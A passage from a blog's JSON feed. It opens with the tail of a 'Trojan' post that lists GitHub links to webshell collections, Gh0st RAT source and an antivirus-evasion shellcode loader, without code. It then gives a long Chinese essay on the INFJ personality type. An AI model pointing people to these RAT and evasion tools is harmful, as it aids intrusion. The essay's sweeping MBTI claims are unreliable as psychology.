data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4Q3VTTzQvREhMWUs=\">https://github.com/0xCuSO4/DHLYK</span></p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#实际生成的源码是在bilibili找到的，链接没找到</span><br></pre></td></tr></table></figure>\n<h3 id=\"7大马\"><a class=\"markdownIt-Anchor\" href=\"#7大马\">#</a> 7. 大马</h3>\n<p>github 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FhYnlzcy1UZWFtL1dlYlNoZWxs\">https://github.com/Aabyss-Team/WebShell</span></p>\n<h3 id=\"8gh0st\"><a class=\"markdownIt-Anchor\" href=\"#8gh0st\">#</a> 8.gh0st</h3>\n<p>github 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2lHaDBzdC9naDBzdDMuNl9zcmM=\">https://github.com/iGh0st/gh0st3.6_src</span> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyaXR5Tm8xL0doMHN0MjAyMw==\">https://github.com/SecurityNo1/Gh0st2023</span> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NjMjgyNTYvQ2NSZW1vdGUv\">https://github.com/Cc28256/CcRemote/</span></p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#环境没有配置好，没有生成此工具的马</span><br></pre></td></tr></table></figure>\n<h3 id=\"9shellcode-to-exe\"><a class=\"markdownIt-Anchor\" href=\"#9shellcode-to-exe\">#</a> 9.Shellcode to exe</h3>\n<p>github 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL055RHViaDMvQ3VpUmk=\">https://github.com/NyDubh3/CuiRi</span> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzF5MG4vQVZfRXZhc2lvbl9Ub29s\">https://github.com/1y0n/AV_Evasion_Tool</span><br>\n 简介：掩日 - 免杀执行器生成工具，可将 shellcode 加载为可执行 exe</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#环境没有配置好，没有生成此工具的马</span><br></pre></td></tr></table></figure>\n<p></p>\n",
            "tags": [
                "Trojan"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2023/04/01/MBTI/INFJ%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/",
            "url": "http://www.n1h1l157.live/2023/04/01/MBTI/INFJ%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/",
            "title": "INFJ 深度解析",
            "date_published": "2023-03-31T16:00:00.000Z",
            "content_html": "<p>INJ 观念来自于动物本能的抽象，终生处在浑沌状态，无法融入现实，却又非纯粹精神境界。是永难了解自己，更害怕他人解析的怪人。</p>\n<h3 id=\"infj-解读\"><a class=\"markdownIt-Anchor\" href=\"#infj-解读\">#</a> INFJ 解读</h3>\n<p>INFJ 终极之道，是超自我实现，是帮助他人具足自身以求得个人具足自身。每种人的道不一样，个人又略有不同，然而最后的幸福感，却是殊途同归。</p>\n<p>终生以认识自我抽象意识为职志，所有的一切都是依此铺展开来，第一内在印象成为认知处理一切的最本源基础。</p>\n<p>INJ 的 Se 必然是最弱环节，真正的 INJ 必然与现实脱离而概念化现实。许多人说擅长球类、拳脚、街机，那不是 INJ，99% 误判，1% 是反客为主的病态人格。</p>\n<p>INFJ 排斥宗教却有着教义般的自发性言行举止，也有极高的哲学天分，尤其在发挥想像力环节的部分。因为对自性本源的虔诚，所以能够散发出宗教式的圣洁光芒，虽然外在行为可能淫乱放纵。</p>\n<p>对事物追根究柢的精神配合想像力的抒发，使独特视角的哲学气息，在无形中成为人格的一部分。</p>\n<p>INFJ 是理念型人，符合理想可以抛却一切。爱情关系中，INFJ 的爱，极为深刻真挚，只要是对的人，是价值共鸣的鸾凤，牺牲生命也是可能的。</p>\n<h3 id=\"ni的理解\"><a class=\"markdownIt-Anchor\" href=\"#ni的理解\">#</a> Ni 的理解</h3>\n<p>对现象界常视而不见，专注在范畴与意义本体的真实，不沉溺于现象界的虚妄所致。</p>\n<p>Ni 是先天理念的人间印象，是社会集体遗留 DNA 讯息。沉浸在理念世界里产生天命般的信念，就是 INJ 认知实体、现象界的主要来源。</p>\n<p>INJ 只要一点点讯息源，就能以上帝视角通透一切。Ni 的顿悟其实也是厚积薄发，只是过程与众不同。</p>\n<p>Ni 集体无意识是远古遗留的精神本能，与动物本能相似但不同。</p>\n<p>Ni 认知毋须海量参考来建立模式，因此会显得奇特而孤僻。Ni 重在汲取能与集体无意识交互作用的讯息方有帮助。</p>\n<p>INJ 辅助功能发展为世俗成就高低的标竿，却幸福感无关。</p>\n<p>当智慧的成长达到一定标准时，Ni 感知将习惯性地透过表象直视真实，不迷失在五感中属性感受，不受限于逻辑思维的概念陷阱。</p>\n<p>INFJ 看到人的真实意图与未来可能，INTJ 体验到战略部属的本能直觉，两者都能超越现象与自我迷障，体验到宇宙本体。</p>\n<p>Ni 的真实需求是本能的反应，所以 INFJ 会悲悯而执着于永恒挚爱。然而即便洞察虚妄，也自我催眠，试图在沉没成本中寻求不可能的回报。</p>\n<p>寻求真实的本性只是一种需求与倾向，不代表必然拥有分辨真实与否的能力，更多的人迷失在错误的自我认识中，以为找到真实本身，而虚耗珍贵的爱人能量。</p>\n<p>Ni 以极少量的外界讯息，藉由天赋筛选体系，利用本体智能，推演实然应然妥协后的答案。Ni 早慧而外显迟缓，Ti 晚成而无感于情。</p>\n<p>MBTI 中的 Ni 是最玄的功能，只能意会无法言传，荣格本身就是以玄学方式定义这功能。</p>\n<h3 id=\"本体的终极寻求\"><a class=\"markdownIt-Anchor\" href=\"#本体的终极寻求\">#</a> 本体的终极寻求</h3>\n<p>照见真实无妄，洞澈虚假黑暗，找寻与真正存在的关联意义本原。</p>\n<p>INJ 普遍无视于表象世界的属性，终生追求真实无妄的真正本体。INFJ 更关注于人性间互动的真实本相，不易为外表交流的人际意图所左右，所以内在情感极为早熟。</p>\n<p>S 迷失在巴纳姆般中的人性共相描述与魔术般的各种奇迹神通中，INFJ 试图寻找本能的真实映照</p>\n<p>infj 利用对本能的充分理解与验证，认识人性的必然、或然与应然，以此建构自我的人性意义基础，并结合生命的存在现实，洞察自我与他人的人生走向。</p>\n<p>对人事物本质性的洞察力奇高，能够观察到本质共相间的关联性，因而有意无意间忽视虚假现象的陈列，预测只是表象，直接看到因果的必然性是根本原因。</p>\n<p>优势沉溺在 S 类侠骨柔情的态度行为中，如何突破表象寻找自我与客体关联性意义本质，成为人生意义本身。</p>\n<p>INFJ 是意义导向人，对于虚伪表象极为排斥，在不违背基本原则下，才会体谅到外界情绪。</p>\n<h3 id=\"神秘主义的深层意涵\"><a class=\"markdownIt-Anchor\" href=\"#神秘主义的深层意涵\">#</a> 神秘主义的深层意涵</h3>\n<p>Ni 天性感知内在抽象化的本能，了解表面现象不是范畴，更非真实存在，因此对未知的背后真实存有敬畏之心。</p>\n<p>Ni 感知事物的表象，并体会到范畴规律的运作，然而该讯息背后的因由为何？追寻这原因的不同方法，产生不可知论与神秘主义。</p>\n<p>INFJ 的不可知论与神秘主义，都是体悟到与真实的距离，而在心中留取一定空间来隔离真理需求感，藉以安适内心的浮躁，也因此期盼获得无限变动表象中，暂时性的永恒真实感。</p>\n<p>虽然潜意识中明白真实的不可及性，然而人性的空虚终究需要一种暂时的栖息，两种主义就成为寄讬的途径了。</p>\n<p>Si 想要寻找一种未知的大能者作为依靠，表象接近动机不同，所造成的实质影响更是南辕北辙。Si 认识世界感受到远处模糊与不真实，只愿意皈依、信仰于暂时态中求取稳定感。</p>\n<p>Ni 不满足感官与粗浅概念的认识，希望拨开迷雾，望见真实，尽管无能为力，亦终生无悔。</p>\n<p>健康的 INFJ 会在生命过程中确立自我定位，知行合一的寻求永恒不变的本体与万变不离其宗表象间的整合。</p>\n<p>幸福的源头不来自于可见的外在显荣，而是利用外在力量帮助自我找到真实的主体意义。</p>\n<p>解开心中无限的谜题是兴趣所在，彰显意义本质是成就感的来源。</p>\n<p>INFJ 在生命中寻求无限循环的内在经验，开发自我独特的人生体验，认识自我是最终幸福的源泉，只有真正找到自己，也才能在他人身上找到存在的意义感。</p>\n<h3 id=\"三种分类\"><a class=\"markdownIt-Anchor\" href=\"#三种分类\">#</a> 三种分类</h3>\n<h4 id=\"理性的理想主义者\"><a class=\"markdownIt-Anchor\" href=\"#理性的理想主义者\">#</a> 理性的理想主义者</h4>\n<p>内在认知与 INTP 极为接近</p>\n<p>藉由不矛盾系统来认识世界与人性</p>\n<p>不迷信、不谈星座、不算命、不迷恋非理性的神秘领域</p>\n<p>时常质疑内外界的一切，来建立个人独特的思想观念，情感需求低</p>\n<p>追求自我实现的同时，也重视外界肯定和声誉。</p>\n<h4 id=\"感性的理想主义者\"><a class=\"markdownIt-Anchor\" href=\"#感性的理想主义者\">#</a> 感性的理想主义者</h4>\n<p>重视情感、亲密性，通常被动的判断异性动机、目的、态度。</p>\n<p>会主动追求心动的对象，喜欢建构人性系统来区分亲疏界限，对于抽象领域并不深究</p>\n<p>适合与 FP 拍拖，结婚对象通常落入低阶需求中选择，是潜在的花花公子、交际花类型。</p>\n<h4 id=\"完美的理想主义者\"><a class=\"markdownIt-Anchor\" href=\"#完美的理想主义者\">#</a> 完美的理想主义者</h4>\n<p>有道德的维护者之称，有礼有节，追求和谐，但大都落入伪君子窠臼。</p>\n<p>接近世俗而排拒之，喜爱享受却自责。停留在舒适区中幻想一切，是心情愉悦的来源。</p>\n<p>重外表、擅打扮，懂享乐，是 INFJ 中最不具灵性可能的类型。</p>\n<h4 id=\"共同点\"><a class=\"markdownIt-Anchor\" href=\"#共同点\">#</a> 共同点</h4>\n<p>内在共性都是对时间维度特别敏感</p>\n<p>终生追求永恒、不变、绝对信念</p>\n<p>着重心灵相契合的灵魂伴侣</p>\n<h3 id=\"追求永恒不变的爱\"><a class=\"markdownIt-Anchor\" href=\"#追求永恒不变的爱\">#</a> 追求永恒不变的爱</h3>\n<p>冥冥中关系的稳定发展，是对人性深层需求的真爱理解。INFJ 能从远古记忆的化约中，洞悉感情中的虚伪、假象与短暂。</p>\n<p>随着生命历程的遭遇累积，逐渐动摇永恒不变真爱的需求，最终会偏向于爱自己较多的柔情与呵护。</p>\n<p>尽管知道这是短暂的表象，然而妥协心态还是不断考验着自我灵性发展，能否突破现实的泥淖，成为未来成熟与否的决定性因素。</p>\n<p>INJ 的魅力在于勘破表象发觉真实的潜在能力，其痛苦也源自于现象界的种种无法符应内在真实认识所致。</p>\n<p>达到一定智慧程度的 INFJ 能够分辨真爱、假爱与伪爱。在认识表象与本体的差异和关系中，Ni 拥有先天的优势，即便在资讯不足的前提下，也常常能抽绎出真实。</p>\n<p>INFJ 的爱是来自于全方位母性的爱，是无限包容，事前也是无限挑剔的。因为投注心力的预期，导致真正的爱情难以孵化，时常拥有的是表象好感、喜欢与崇拜心态的交互作用。</p>\n<p>发展健全的 INFJ 在情感世界，是 MBTI 分类中最为执着的类型。在理解了世界对价性运作原理后，渐渐不在为曾经拥有而打动心弦，天长地久最终成为所有一切奉行不渝的准绳。</p>\n<p>INFJ 将理念融合在生命核心中，使所有与理念共鸣的事物赋予高贵的意义；而 INTP 将人生与宇宙的探索当作生命意义的本身。爱情使 INFJ 无悔，做本读不完的书，也能使 INTP 一生一世爱之不尽。</p>\n<p>以爱情为价值优位的 INFJ 极为迷人而不偏激，不易以社会价值凌越个人优位的虚幻人生观。是将满溢的爱，次第辐射影响周遭，使成为真正成熟富魅力的健全人格倾向。</p>\n<p>人在受到现实阻碍后，会怀疑自我观念的错误而惶惶不安，INFJ 自意识以来对外界不确定性的紧张与无助，在无力克服后，试图整体掌握而使心绪安详，外表整理得到速成时效与即时的虚荣。</p>\n<p>找到人生正确道路的 INFJ，迅速摆脱过往的慵懒或颓废，上进而执着，默默地在本业上投注所有心力，绝不朝三暮四，不为金钱所动</p>\n<p>爱情的需求却是横梗着所有人生阶段的必然需求，找不到值得的对像付出是人生最重要的悲哀，有时比无法自我实现还更令人痛苦。</p>\n<p>INFJ 的世界观是偏向本质宿命的必然，因此特别着重于人生价值的寻找与执着。</p>\n<p>主观情感过度投入而过于期盼未来相应回报，外显成为恋恋不忘与藕断丝连的深情，实则本质上是无情的演绎而已。</p>\n<p>INFJ 的爱是迟后现像的付出，是敏感本质的小心翼翼。纠缠的执着倘若是真心而深刻，对 INFJ 的情感冲击是无与伦比的。</p>\n<p>INFJ 的感性抒发通常极为内敛深刻，由于对自我深刻的探索与对他人敏锐的觉察，导致过于向外依赖情感的辐射与寄讬。</p>\n<p>发展健全的 INFJ 则渐渐向内心求得对世界与人生的系统性理解，找到内在稳定的力量后，真正爆发出非外在条件的真正本质性魅力。</p>\n<h3 id=\"劣势功能se的副作用\"><a class=\"markdownIt-Anchor\" href=\"#劣势功能se的副作用\">#</a> 劣势功能 Se 的副作用</h3>\n<p>迷失于红尘，忘却生命中信念的核心，今生将难以找回真正幸福的关键</p>\n<p>正常发展的 INJ 必然不会早恋。早恋大都是性欲、享乐、虚荣与外貌协会的因素，Ni 对人性的认识早熟，且天然排斥 Se，行为又晚熟，因此大都晚恋居多。</p>\n<p>迷恋于性的 INJ，尤其是 INFJ，整个人格逐渐被吞蚀殆尽，不复往常的灵性、灵觉、灵动。不仅才华尽失，也会变得更加孤僻，真正隔绝于世。</p>\n<p>迷恋于性，会使 INFJ 愤世嫉俗、人格分裂、疑神疑鬼，成为庸俗、市侩、疯狂、变态的人渣，问题还不自觉，尚自我感觉良好，自然是意图骗人，却真骗了自己。</p>\n<p>INFJ 是性迷恋，情感深邃并愚忠，加上性吸引会导致过度的爱，或称之为变态爱。</p>\n<p>Se 对于 INFJ 的破坏力，远高于 INTJ。轻则失去灵性庸碌一生，重则精神癫狂，不可理喻。现实中 INFJ 疯子可不少喔！</p>\n<p>沉溺在 Se 的 INFJ 毫无灵性，会失去独特魅力而失去美感，笨拙的 INFJ 只会暴露出情感与外型的缺陷而已，真正吸引人的灵魂之光，早已熄灭，再也吸引不到同频率的人与之共舞了。</p>\n<p>Ni 优势是先天灵觉特别强烈，INJ 是否能开发智能与发挥能力完全依赖内省式追求。几乎所有讯息都经由先天理念筛检而印象化，产生的结果转化成信念，外显执着、顽固、而虽千万人吾往矣！</p>\n<p>INJ 在成年后的某一契机中，享受到 Se 的新鲜、成就感，致使迷失于现象界中失去自我。这也是许多 INJ，产生自我矛盾后，怪异思想、态度的主要来源。</p>\n<p>人的主导类型是灵魂本体，是存在意义的来源，辅助功能只是达成心愿的手段、工具，手段可以制衡、平衡、追求全方位无死角，但心灵核心的本愿是不可以挑战的领域。</p>\n<p>轻者暂时迷失而言行荒诞，重者本末倒置，失去自我。许多人的忧郁、低潮、甚至自毁倾向，就是因为享受到劣势功能发展的见识扩展而一去不回。</p>\n<p>INJ 对现象界的追求，并非现实事物的报偿，而是自我实现的必要经历。人生的意义本身是在追寻个人先天理念，所有外界都是辅助手段，本心的满足是最根本的幸福感来源，本末倒置的结果，有可能收获颇丰，但无助于真正欲望的满足。</p>\n<p>Se 对 INFJ 有致命吸引力，然而天性所致，无法正确认知现实世界，总将五感所及的世界，无意识间直觉化，脱离现实事小，歪曲了现实事大。</p>\n<p>infj 与 intp 吸引是内在真实需求的渴望，但两者多疑性格，使之难以开始与持续。彼此认为对方是多情轻率，或是滥情无爱。</p>\n<p>INJ 极易为 SP 所吸引，然而各种生理激素功效一过，SP 仅存的是功利性的依赖，误解的浪漫与内在欣赏不过是南柯一梦。SP 不会有永恒不变的追求，只会掌握现在的愉悦，激情的碰撞</p>\n<p>年轻的 INFJ 会因择偶期的造型尝试，与 SP 人产生激情碰撞，且因不舍沉没成本，而徒耗精力青春于注定消逝的情感上。短暂的欢乐激情，留下永恒的创伤。</p>\n<p>SP 依照生理激情转头就爱上他人，过往不过梦幻一场，内心不会留下任何痕迹，而 INFJ 将为期数年舔舐伤口，且永难痊愈。</p>\n<h3 id=\"安全感的追求\"><a class=\"markdownIt-Anchor\" href=\"#安全感的追求\">#</a> 安全感的追求</h3>\n<p>人性万变中的不变因素是终生所追求的境界，当部分掌握人性的规律时，INFJ 才能有所遵循而自我强化信念意志，反之会不安浮躁而不知所措，错误的抉择大都于迷失自我时所决定。</p>\n<p>Ni 需要发现真实或至少创造一种形而上规律来获取内心依靠，安全感是自内心而来，自孤独中展现坚强，自沉默中获得力量。</p>\n<p>Si 试图寻找规准来遵循，是种向外求取安全感的动机展现，Si 因地制宜，酷似变色龙，Ni 寻求真实或虚拟真理，作为终生不易的信念准绳。</p>\n<p>INFJ 本质上是非常自卑式的自负，自卑的是客观条件的不足与观念奇特的不能融合外界，自负的是思想的深邃配合见识的展开，导致对人事物本质与未来发展可能的了然于心。</p>\n<p>安全感是俱足自身后的必然产物，并非外在事物可以填补，毕竟欲望是无尽虚空，无有止境的。</p>\n<p>颓废的 INFJ 是极端缺乏安全的的典型，当失去独立思考能力时，也会从众而求取暂时的心绪宁和，然而这与本性是完全冲突的属性，时日一长会导致失去本心真我，一生庸碌而无所作为。</p>\n<h3 id=\"不离不弃的婚姻观\"><a class=\"markdownIt-Anchor\" href=\"#不离不弃的婚姻观\">#</a> 不离不弃的婚姻观</h3>\n<p>道德崇高感的追求是为了永恒爱情的维系，宁愿承受伤害，也要寻求幸福的可能性</p>\n<p>容易忽视潜在对像的外在条件，而有两种方向发展：一是重视彼此心灵共鸣与智慧开化促进的面相；一是关注当下色性与享受本能的满足。</p>\n<p>由于不由自主的难与他人表面唱和，能够随和的深度与时间有限，故而遭遇心灵共鸣对像机率不高。随俗从众的人，会认命于身心分离，一旦智慧开化，婚姻中会不断产生精神外遇的事实。</p>\n<p>终生爱情需求强烈的 INFJ，中年后的外遇机率超过平均值，系因起初找到真正共鸣对像机率过低，而关系持续中又过于自我本位，导致沟通不良成为常态。</p>\n<p>抛开世俗之眼，关注意义本原，不为外界所扰，直指本心需求。INFJ 倘若慎始，得到真爱与幸福婚姻的潜力是高于平均值的。</p>\n<p>INFJ 追求的是不变的关系，INTP 追求的是真实的爱情，两者容易产生火花。发展健全的两者是天作之合，反之，最终还是渐行渐远。</p>\n<p>健康的 INFJ，基于对婚姻永固的期盼下，也倾向于真实爱情的获得；正常发展的 INTP 也是一样，由追求真爱，倾向于构筑恒定不变的家庭。</p>\n<p>常常执着于过去式沉没成本的留恋，失去理性判断，是未来厌恶自己的内省必然。</p>\n<p>健康的 INFJ 有着满溢的爱能够付出与外界众生，找到自性本原时，更有源源不竭自发动力。因此，此时刻的亲密爱人，能够享受到奇特而专注的爱，这种爱有别于泛泛众生基于激情式的爱，而是与灵魂连结的永生纠缠的爱。</p>\n<h3 id=\"独立思考能力\"><a class=\"markdownIt-Anchor\" href=\"#独立思考能力\">#</a> 独立思考能力</h3>\n<p>INFJ 是感性理想主义的极致，失去自我实现时会失去人生动力，而倾向于放纵自我与享乐，找到适合的目标后，会无比的顽强与坚持，充分发挥理性以辅助感性的运作。</p>\n<p>着重恒久不变的 INFJ，初期容易在选择的路上彷徨，一旦确定方向，能爆发出惊人的潜力与持久力。人生不顺时，容易慵懒或过度苛刻自己，短暂的低潮，是下次跃起的主要动力。</p>\n<p>无论对人事物，INFJ 都有倾向于永恒不变的需求。永恒的价值执着、永恒的爱情婚姻、永恒的亲情羁绊、永恒的事业发展、永恒的自我学习。</p>\n<p>对于一整个化个人内在体系的追求，是 INFJ 毕生自我满足的焦点。只有整体并简化成概念型的系统认知，方能帮助心境稳定而坦然面对人生。</p>\n<p>INFJ 也是人，虽有着追求神性的一面，也有着踏实的认知。然而封闭的内在心性，通常由爱侣启发，自我发展的潜力倘若超过爱侣的可能性时，内在无意识的排斥，成为自我厌恶的暂时心绪。</p>\n<p>连接本原自性的自己，却能看透表像连结不相干事物为有意义的系统，而能预测未知与未来。</p>\n<p>INFJ 的善良内在过于隐而难显，诉诸于行为也容易遭到误解，系因任性的外表下有着悲天悯人实质，因为同理心的强大，使外界遭遇容易连结自我本原，内省与幻想成为日常生活的必然。</p>\n<p>INFJ 内世界有无限细腻的直觉思维，能将外界一点点的感受，化作终生信守的理念，能够从分毫变化中，掌握人性奥秘。</p>\n<p>如果一个点能够看到全世界，INTP 却要立体模型才能臆测未来，INFJ 在时间流变化之中，能够无视时间阻隔，过去、现在与未来，仿佛成为可穿梭自如的芥子纳须弥境。</p>\n<h3 id=\"内心深处\"><a class=\"markdownIt-Anchor\" href=\"#内心深处\">#</a> 内心深处</h3>\n<p>INFJ 是聪慧而孤独斗士，是从无视时间流变化中的神秘世界降生的先知。幼年时，走路撞墙、跑步跌倒、仿佛不食人间烟火的化外隐士，世界的现实与自己无关，只能感受到人心的变化。</p>\n<p>对人性的因果业力，无论个人还是团体都能牢牢掌控核心概念。然没有人能够理解自己灵魂需要，没有，从未。</p>\n<p>成熟的 INFJ，逐渐适应与外界的疏离，能在外在社会中，观察并领略到人性的共殊相，不在无助的仿佛灵魂离体般，感受世界的若即若离。</p>\n<p>INFJ 是灵性的理想主义者，喜欢与挚友、亲人或爱人，心心相印式的单独相处，常常简单的相依偎，也能轻易满足渴求的归属感。</p>\n<p>虚拟梦幻的爱，将自己与世界对接，填满了挑战自我与现实的新动能。</p>\n<p>多数的 INFJ，常常无法知道自己需要什么？能做什么？甚至在做什么！成熟与童心并存的内心，到底拥有什么令人难解的秘密呢？</p>\n<p>说蠢笨？却是伪装，说智慧？居然难以理解自己的核心自我！对自己的定位模糊，却又对他人心灵有极特殊的洞察力，说内敛矜持，却对爱慕的对象幼稚无比。</p>\n<h3 id=\"未来发展\"><a class=\"markdownIt-Anchor\" href=\"#未来发展\">#</a> 未来发展</h3>\n<p>极擅长透过间接与次要因素，推理出接近事实结论；能无视时间跨度，找寻永恒真理；敏锐的视角与嗅觉，能勘透本质性的趋势，因此擅长作跳跃性预测，尤其与人性相关领域。</p>\n<p>发展健全的 INFJ，成年之后逐渐找到与自我本原连结的方法，在累积阶段性成就后，逐步找到内在自信。</p>\n<p>部分沉沦的 INFJ，则放弃性格优势，从俗从众而迷失于与自我真心相违背的财色追求来总结一生，当混混沌沌而精神与物质两方亏缺，郁郁终生怨恨他人与社会成为大概率结局。</p>\n<p>在于与他人心灵接触后开始，之后的发展也倾向两极化，深邃者如圣贤，肤浅者化为凡夫庸脂。</p>\n<p>忽略时间的影响是其缺点也是优势所在，缺点是无法在忙碌的现代中，找到该有的节奏，优势是能敏锐的洞察本质与永恒性的事物核心与共相，在长时间浸淫的专业领域中，能够突破智能，挑战自我上限。</p>\n<p>INFJ 喜欢在时间流中，观察人性的发展。</p>\n<p>主导性格 Ni 必然鄙视 Se 的价值观，潜意识中又觉得缺失的补足重要性，因此生命历程中会有倾向于 Se 发展的迷茫时期，择偶也常常被相反性格的魅力所吸引。</p>\n<p>然而，所有 Se 类的尝试都注定失败，无论在工作与爱情层面，都在逆反心理下，产生莫名的偏好，只能在不断试错中，找到宿命中的天命依归。</p>\n<p>INFJ 的 Fe 只是阶段性利用，在人生旅程中仅占有辅助性角色。沉迷于人际关系中的幸福，是找到自我前 INFJ 的通病，受到周遭影响，高估人际间的情感重要性，然而生命的旅程，必然是孤独的。</p>\n<p>暂时性的辅助与间歇性的感受，并非终极需求，未来模糊不定，人性在变动中又如何求取永恒呢？</p>\n<h3 id=\"infj与intp\"><a class=\"markdownIt-Anchor\" href=\"#infj与intp\">#</a> INFJ 与 INTP</h3>\n<p>INFJ 型号的确认，其中之一就是：能否感受到 INTP 的智性美，感觉 INTP 是无情无义的机械人，那是因为频率差异无法接收，是 INFJ 机率不大。</p>\n<p>INJ 是唯二能够欣赏并赞扬 INTP 内在概念模型美感的人，连 INTP 之间都常常无法将两个宇宙模型相融合。</p>\n<p>Ni 的内在直觉直通集体潜意识，能够接纳一座内在不矛盾系统。Ni 本身就储存许多极端抽象化的系统模型，TiNe 的模型刚好唤醒内在心灵，帮助其触摸到本体灵魂的真善美。</p>\n<p>INTP 能帮助 INFJ 发现自己的潜能，能够弥补逻辑性的缺漏，而彼此间劣势功能的短暂唤醒，也能帮助两者更好的融合。</p>\n<p>这两类人彼此吸引又排斥，吸引的是灵魂相契的美感，排斥的彼此误解、现实困难或误解劣势功能的需求不满。</p>\n<p>INFJ 与 INTP 之所以适合，是因为思维上彼此需要、情感上互补。在他人眼中可能不像夫妻生活，因为心灵相契、精神相知，比表面的同床异梦重要。</p>\n<p>将伴侣放在心中最重要的地方，却不干涉彼此的独立性，这是 INFJ 与 INTP 婚姻生活中最典型的写照。</p>\n<p>一般人是好感、喜欢、再产生爱情，这对伴侣却必然有相互欣赏、彼此佩服与相互崇拜的过程。但都属于隐士生活的类型，甚少为人所知、所观察得到。</p>\n<h3 id=\"intp对爱情的诉求\"><a class=\"markdownIt-Anchor\" href=\"#intp对爱情的诉求\">#</a> INTP 对爱情的诉求</h3>\n<p>INTP 喜欢文字交流，对兴趣、才华、人性层面都是可以着力的地方。崇尚智慧而平等待人，欣赏有大智慧、聪明的异性。欣赏智性美，可能谈理到动情。</p>\n<p>INTP 对于爱情纯粹无所求、一厢情愿。排斥理性，情绪化、但是也喜欢愿意袒露内在真实的人。喜欢与自己能不分彼此，一起玩、一起闹、一起思考人生宇宙的另一半。</p>\n<p>INTP 的需求层次，大都是尊重、自我实现，INFJ 则是归属性需求以上。这是两者相配的地方，也是纷争的起点。</p>\n<p>INTP 几无归属性需求，是我自求我道的孤鹰，INFJ 对于情感的索求，常常超过对方的负担。因此，INFJ 认为 INTP 很无情，反之认为是麻烦，其实都是心中认定后不在改变，可以彼此放心的类型。</p>\n<p>INTP 在诸多的言行、文字中，找寻非一致性的逻辑矛盾，据此推论真假善恶；寻找其隐藏意涵，臆测其动机、目的、甚至可能的手段，藉此判断其好坏善恶。</p>\n<p>INTP 对于爱情纯粹无所求和一厢情愿，INFP 会被这种气质吸引，INTJ 有保护 INTP 的欲望，而 INFJ 会极度好奇。</p>\n<h3 id=\"吸引力的由来\"><a class=\"markdownIt-Anchor\" href=\"#吸引力的由来\">#</a> 吸引力的由来</h3>\n<p>接近 INTP 的方法，不是虚伪的关怀体谅，而是积极的理解、谅解他建立的个人认知体系。</p>\n<p>INFJ 与其他类型不同，只要做自己，对 INTP 就具有不可思议的吸引力。关注其兴趣移转的方向，尊重其人生规划，向其提出兴趣方向的质疑。INTP 适合远距恋爱。</p>\n<p>INJ 不要求合理性，而是要求舒适性。对 INP 温柔、体贴有反作用，对 INJ 是必杀技，所以，敏锐地察觉其关注的重点，温柔而非讲理，体贴没有距离，发觉其潜在自认优秀之处是交往的重点。</p>\n<p>INP 间可以谈理谈到动情，这对 INJ 而言是不可思议的，虽然许多 INJ 貌似理性，但骨子里是将理性当作达成舒适感的工具，这与 INP 完全不同。</p>\n<p>INFJ 对性行为的观念、态度与行为和 INFP 也不相同，INFP 是可以享受纯性交带来的快感，能够温柔的对待伴侣的性需求，当然也乐于一夜情，这在 INFJ 简直是不可思议的。</p>\n<p>INFJ 就对性行为有先天的罪恶感，不是矜持的不可思议，就是凌虐、怪异与各种错误认识，相当的令人费解。</p>\n<p>重要的部分与态度包容都在合理范围之内，彼此崇拜是大概率的可能，但若对异性焦点堕落到世俗价值观，是必然没有结局的。只有接近理想态的双方，才可建立真正的情感。</p>\n<p>INTP 对情感的隔离与 INFJ 对隐私、独处与想像的爱情有互补之处，INFJ 对被理解、倾诉与爱护的需求，INTP 刚好能够做到，双方都是对方一辈子读不完的书。</p>\n<p>INJ 会莫名执着于本能抽像的信念，因而陷入自我怀疑与神秘主义，后者是精神与心灵升华后的统一，更偏向理念世界的综合、坚持与执行。</p>\n<p>INJ 吸引力，源自于本能抽像化后的神秘信念。第六感非自外于五感，而是综合一切可能性产生悟性。</p>\n<p>无来由的信念丛集，本身无法得知推论程序，因此无法逆推源头，外显就是无理由的顽固、怪异荒诞的行为、不可思议的思维结论。如果 INTP 很难表达内在逻辑，INJ 是因为没有逻辑。</p>\n<h3 id=\"理想中的另一半\"><a class=\"markdownIt-Anchor\" href=\"#理想中的另一半\">#</a> 理想中的另一半</h3>\n<p>INFJ 的信念不容置喙、质疑，甚至是生存意义之所在，因此生命过程中环境刺激的差异，极大影响终生信念的种类。</p>\n<p>INTP 是逻辑王，生命意义是建构一切的本体理念，崇尚智慧而平等待人，排斥非理性、情绪化的人事物。</p>\n<p>INTP 贪图 INJ 深情执着，INJ 崇仰 INTP 博学智慧。两者相互误解彼此高估，易产生心动感觉。</p>\n<p>其实 INJ 只爱自己，INTP 也愚蠢不堪，内分泌影响，放大彼此优势，遮掩不可改变的根本习性，没有真切理解，贸贸然结合，结果更可能是同床异梦、各行其是而已。</p>\n<p>INFJ、INTP 相恋初期，常磨合不良，大都是情感需求时空不对接，而误解双方真情所致。这配对一定要刻意重视些，无意义与虚伪的形式浪漫，目的是证明彼此对爱情的坚贞。</p>\n<p>实际观察中，无论远近距离恋爱，大都三观相似、感情稳定、性格互补、智慧相仿、需求能彼此满足、也几乎不可能劈腿。</p>\n<p>INFJ、INTP 对外貌需求不高，气质、才华能加成条件 100% 以上。INFJ 欣赏原型美，是寻找梦中情人的气味，是以气质为主导，且重视关系稳定度的情感需求。</p>\n<p>INTP 欣赏智性美，关系确定前较为功利，但幼稚纯朴的真情需求，喜欢与自己能不分彼此，一起玩、一起闹、一起思考人生宇宙的另一半。</p>\n",
            "tags": [
                "INFJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2023/04/01/MBTI/INFJ%E8%A7%A3%E8%AF%BB/",
